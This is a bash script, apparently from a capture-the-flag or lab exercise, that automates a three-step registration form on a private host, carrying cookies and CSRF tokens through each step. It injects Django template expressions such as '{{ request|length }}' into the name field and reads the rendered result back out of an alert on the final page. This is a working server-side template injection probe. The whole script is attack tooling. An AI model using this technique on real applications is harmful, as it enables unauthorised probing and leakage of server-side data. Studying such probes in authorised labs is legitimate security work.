probe() {
  rm -f /tmp/cjp
  curl -sS $H -c /tmp/cjp http://172.20.0.3/accounts/register/step1/ -o /tmp/a.html
  TOK=$(grep -o 'csrfmiddlewaretoken" value="[^"]*' /tmp/a.html | cut -d'"' -f3)
  curl -sS $H -b /tmp/cjp -c /tmp/cjp --data-urlencode "name=$1" -d 'password=Passw0rd123!' -d "csrfmiddlewaretoken=$TOK" http://172.20.0.3/accounts/register/step1/ -o /dev/null
  curl -sS $H -b /tmp/cjp -c /tmp/cjp http://172.20.0.3/accounts/register/step2/ -o /tmp/b.html
  TOK=$(grep -o 'csrfmiddlewaretoken" value="[^"]*' /tmp/b.html | cut -d'"' -f3)
  curl -sS $H -b /tmp/cjp -c /tmp/cjp -d "csrfmiddlewaretoken=$TOK&email=t@t.local" http://172.20.0.3/accounts/register/step2/ -o /dev/null
  curl -sS $H -b /tmp/cjp -c /tmp/cjp -D /tmp/h3b http://172.20.0.3/accounts/register/step3/ -o /tmp/s3b.html -w "%{http_code} "
  printf '%s => ' "$1"
  python3 - <<'EOF'
import re,html
h=open('/tmp/s3b.html').read()
m=re.search(r'alert\("Hello (.*?). Just Now',h,re.S)
print(html.unescape(m.group(1))[:300] if m else 'NOALERT')
EOF
  LOC=$(grep -i '^location' /tmp/h3b | tr -d '\r' | awk '{print $2}')
  [ -n "$LOC" ] && echo "   LOC=$LOC"
}
probe '{{ csrf_token|length }}'
probe '{{ request|length }}'
probe '{{ csrf_token|length }}'
